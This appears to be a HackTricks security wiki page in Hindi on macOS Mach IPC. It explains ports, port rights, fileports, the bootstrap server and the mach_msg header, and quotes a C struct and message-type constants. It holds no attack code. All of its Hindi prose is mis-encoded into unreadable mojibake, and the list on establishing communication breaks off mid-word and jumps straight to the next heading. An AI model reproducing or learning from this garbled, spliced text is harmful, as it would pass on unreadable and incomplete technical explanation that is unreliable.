# macOS IPC - рдЗрдВрдЯрд░ рдкреНрд░реЛрд╕реЗрд╕ рдХрдореНрдпреБрдирд┐рдХреЗрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Mach рд╕рдВрджреЗрд╢

### рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

Mach **рдХрд╛рд░реНрдпреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрд╕рд╛рдзрди рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдмрд╕реЗ рдЫреЛрдЯреА рдЗрдХрд╛рдИ** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдХрд╛рд░реНрдп рдореЗрдВ **рдХрдИ рдзрд╛рдЧреЗ** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ **рдХрд╛рд░реНрдп рдФрд░ рдзрд╛рдЧреЗ 1:1 рдореИрдк рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ POSIX рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдФрд░ рдзрд╛рдЧреЛрдВ рдХреЗ рд╕рд╛рде**ред

рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ Mach рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рдХрдореНрдпреБрдирд┐рдХреЗрд╢рди (IPC) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ-рддрд░рдлрд╛ рд╕рдВрдЪрд╛рд░ рдЪреИрдирд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред **рд╕рдВрджреЗрд╢ рдкреЛрд░реНрдЯреЛрдВ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**, рдЬреЛ рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд **рд╕рдВрджреЗрд╢ рдХрддрд╛рд░реЛрдВ** рдХреА рддрд░рд╣ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВред

**рдкреЛрд░реНрдЯ** Mach IPC рдХрд╛ **рдореВрд▓** рддрддреНрд╡ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рдПрдХ **IPC рддрд╛рд▓рд┐рдХрд╛** рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **mach рдкреЛрд░реНрдЯ** рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдореИрдХ рдкреЛрд░реНрдЯ рдХрд╛ рдирд╛рдо рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ (рдХрд░реНрдиреЗрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЙрдЗрдВрдЯрд░)ред

рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ рдкреЛрд░реНрдЯ рдирд╛рдо рдХреЛ рдХреБрдЫ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде **рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░реНрдп** рдореЗрдВ рднреЗрдЬ рд╕рдХрддреА рд╣реИ рдФрд░ рдХрд░реНрдиреЗрд▓ рдЗрд╕реЗ **рджреВрд╕рд░реЗ рдХрд╛рд░реНрдп рдХреА IPC рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдВрдЯреНрд░реА** рдмрдирд╛ рджреЗрдЧрд╛ред

### рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░

рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░, рдЬреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдХрд╛рд░реНрдп рдХреНрдпрд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВред рд╕рдВрднрд╛рд╡рд┐рдд **рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ ([рдпрд╣рд╛рдБ рд╕реЗ рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред Mach рдкреЛрд░реНрдЯ MPSC (рдПрдХрд╛рдзрд┐рдХ рдЙрддреНрдкрд╛рджрдХ, рдПрдХ рдЙрдкрднреЛрдХреНрддрд╛) рдХрддрд╛рд░реЗрдВ рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдкреВрд░реЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╣рд░ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ **рдПрдХ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдкрд╛рдЗрдкреНрд╕ рдореЗрдВ, рдЬрд╣рд╛рдВ рдХрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рд╕рднреА рдПрдХ рдкрд╛рдЗрдк рдХреЗ рдкрдврд╝рдиреЗ рдХреЗ рдЕрдВрдд рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рдХреЛ рдзрд╛рд░рдг рдХрд░ рд╕рдХрддреА рд╣реИрдВ)ред
* **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ рдХрд╛рд░реНрдп** рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдЙрд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ **рдЕрдкрдиреЗ рдХрд╛рд░реНрдп рдХреЗ рдкрд╛рд╕ рдЕрдкрдирд╛ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддрд╛ рд╣реИ**ред
* рдЕрдЧрд░ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рдорд╛рд▓рд┐рдХ **рдорд░ рдЬрд╛рддрд╛ рд╣реИ** рдпрд╛ рдЙрд╕реЗ рдорд╛рд░ рджреЗрддрд╛ рд╣реИ, рддреЛ **рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдЕрдирд░реНрдердХ (рдорд░рд╛ рдирд╛рдо) рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**ред
* **рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ **рдХреНрд▓реЛрди** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдп рдЕрдзрд┐рдХрд╛рд░ рдХреЛ рдХреНрд▓реЛрди рдХрд░ рд╕рдХреЗ рдФрд░ рдЗрд╕реЗ рддреАрд╕рд░реЗ рдХрд╛рд░реНрдп рдХреЛ **рдкреНрд░рджрд╛рди** рдХрд░ рд╕рдХреЗред
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░** рдореИрдХ рд╕рдВрджреЗрд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА **рдкрд╛рд░рд┐рдд** рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдПрдХ рдмрд╛рд░ рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЧрд╛рдпрдм рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
* рдпрд╣ рдЕрдзрд┐рдХрд╛рд░ **рдХреНрд▓реЛрди рдирд╣реАрдВ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ **рд╣рдЯрд╛рдпрд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдЕрдзрд┐рдХрд╛рд░**, рдЬреЛ рдПрдХ _рдкреЛрд░реНрдЯ рд╕реЗрдЯ_ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдмрд▓реНрдХрд┐ рдПрдХ рдПрдХрд▓ рдкреЛрд░реНрдЯред рдкреЛрд░реНрдЯ рд╕реЗрдЯ рд╕реЗ рд╕рдВрджреЗрд╢ рдХреЛ рдбреАрдХреНрдпреВ рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рдЙрд╕рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗ рд╕рдВрджреЗрд╢ рдХреЛ рдбреАрдХреНрдпреВ рдХрд░рддрд╛ рд╣реИред рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдИ рдкреЛрд░реНрдЯреЛрдВ рдкрд░ рд╕рдордп-рд╕рдордп рдкрд░ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдмрд╣реБрдд рд╕рд╛рд░реЗ `select`/`poll`/`epoll`/`kqueue` рдХреА рддрд░рд╣ред
* **рдорд░рд╛ рдирд╛рдо**, рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд▓реЗрд╕рд╣реЛрд▓реНрдбрд░ рд╣реИред рдЬрдм рдПрдХ рдкреЛрд░реНрдЯ рдирд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреЛрд░реНрдЯ рдХреЗ рд╕рднреА рдореМрдЬреВрджрд╛ рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдорд░реЗ рдирд╛рдо рдореЗрдВ рдмрджрд▓ рдЬрд╛рддреЗ рд╣реИрдВред

**рдХрд╛рд░реНрдп рдЕрдиреНрдпреЛрдВ рдХреЛ SEND рдЕрдзрд┐рдХрд╛рд░ рдкрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╕рдВрджреЗрд╢ рд╡рд╛рдкрд╕ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред **SEND рдЕрдзрд┐рдХрд╛рд░ рдХреЛ рдХреНрд▓реЛрди рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рддрд╛рдХрд┐ рдПрдХ рдХрд╛рд░реНрдп SEND рдЕрдзрд┐рдХрд╛рд░ рдХреЛ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░ рд╕рдХреЗ рдФрд░ рддреАрд╕рд░реЗ рдХрд╛рд░реНрдп рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХреЗред рдпрд╣, **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** рдХреЗ рдПрдХ рдордзреНрдпрд╕реНрде рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░, рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдмреАрдЪ рдкреНрд░рднрд╛рд╡реА рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рдлрд╛рдЗрд▓ рдкреЛрд░реНрдЯ

рдлрд╛рдЗрд▓ рдкреЛрд░реНрдЯ рдлрд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рдХреЛ рдореИрдХ рдкреЛрд░реНрдЯ рдореЗрдВ рдПрдирдХреИрдкреНрд╕реБрд▓реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ (Mach рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред `fileport_makeport` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджрд┐рдП рдЧрдП FD рд╕реЗ `fileport` рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ `fileport_makefd` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╛рдЗрд▓рдкреЛрд░реНрдЯ рд╕реЗ рдПрдХ FD рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### рд╕рдВрдЪрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛

рдкрд╣рд▓реЗ рд╕реЗ рдХрд┐рд╕реА рд╕рдВрджреЗрд╢ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП Mach рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рдмрд┐рдирд╛ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рднреЗрдЬ рд╕рдХрддреЗ**ред рддреЛ, рдкрд╣рд▓реА рд╕рдВрдЪрд╛рд░ рдХреИрд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ?

рдЗрд╕рдХреЗ рд▓рд┐рдП, **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** (**рдореИрдХ рдореЗрдВ launchd**) рд╢рд╛рдорд┐рд▓ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ **рд╣рд░ рдХреЛрдИ рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░ рдХреЛ SEND рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдЗрд╕рд╕реЗ рдЙрд╕рд╕реЗ рджреВрд╕рд░реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрд╛рд░ рдорд╛рдВрдЧ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдХрд╛рд░реНрдп **A** рдПрдХ **рдирдпрд╛ рдкреЛрд░реНрдЯ рдмрдирд╛рддрд╛ рд╣реИ**, рдЬрд┐рд╕реЗ рдЙрд╕рдХреЗ рдкрд╛рд╕ **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░** рд╣реЛрддрд╛ рд╣реИред
2. рдХрд╛рд░реНрдп **A**, рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рдзрд╛рд░рдХ рд╣реЛрдиреЗ рдХреЗ рдирд╛рддреЗ, **рдкреЛрд░реНрдЯ рдХреЗ рд▓
### рдПрдХ Mach рд╕рдВрджреЗрд╢

[рдпрд╣рд╛рдБ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛рдПрдВ](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` рдлрд╝рдВрдХреНрд╢рди, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╣реИ, Mach рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдВрджреЗрд╢ рдХреЛ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕ рд╕рдВрджреЗрд╢ рдХреЛ `mach_msg_header_t` рд╕рдВрд░рдЪрдирд╛ рд╕реЗ рдЖрд░рдВрдн рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрджреЗрд╢ рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИред рд╕рдВрд░рдЪрдирд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИ:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ _**рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░**_ рд╣реЛрддреЗ рд╣реИрдВ, рд╡реЗ Mach рдкреЛрд░реНрдЯ рдкрд░ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИрдВред рдЙрд▓реНрдЯреЗ, **рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ** рдХреЛ _**рднреЗрдЬрдиреЗ**_ рдпрд╛ _**рдПрдХ рдмрд╛рд░ рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░**_ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдмрд╛рд░ рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдХреЗрд╡рд▓ рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ, рдЙрд╕рдХреЗ рдмрд╛рдж рдпрд╣ рдЕрдорд╛рдиреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдлрд╝реАрд▓реНрдб **`msgh_bits`** рдПрдХ рдмрд┐рдЯрдореИрдк рд╣реИ:

* рдкрд╣рд▓рд╛ рдмрд┐рдЯ (рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг) рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╕рдВрджреЗрд╢ рдЬрдЯрд┐рд▓ рд╣реИ (рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдиреАрдЪреЗ)
* 3 рд╡реЗрдВ рдФрд░ 4 рд╡реЗрдВ рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ
* рджреВрд╕рд░реЗ рдмрд╛рдЗрдЯ рдХреЗ **5 рд╕рдмрд╕реЗ рдХрдордЬреЛрд░ рдмрд┐рдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╡рд╛рдЙрдЪрд░** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: рдПрдХ рдФрд░ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдкреЛрд░реНрдЯ рдХреБрдВрдЬреА/рдорд╛рди рд╕рдВрдпреЛрдЬрди рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* рддреАрд╕рд░реЗ рдмрд╛рдЗрдЯ рдХреЗ **5 рд╕рдмрд╕реЗ рдХрдордЬреЛрд░ рдмрд┐рдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* рдЪреМрдереЗ рдмрд╛рдЗрдЯ рдХреЗ **5 рд╕рдмрд╕реЗ рдХрдордЬреЛрд░ рдмрд┐рдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ **рджреВрд░рд╕реНрде рдкреЛрд░реНрдЯ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

рд╡рд╛рдЙрдЪрд░, рд╕реНрдерд╛рдиреАрдп рдФрд░ рджреВрд░рд╕реНрде рдкреЛрд░реНрдЯ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдХрд╛рд░ рд╣реИрдВ (рд╕реЗ [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `MACH_MSG_TYPE_MAKE_SEND_ONCE` рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реВрдЪрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ **рдПрдХ-рдмрд╛рд░-рднреЗрдЬреЗрдВ** **рдЕрдзрд┐рдХрд╛рд░** рдЙрддреНрдкрдиреНрди рдФрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕реЗ `MACH_PORT_NULL` рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рди рд╣реЛред

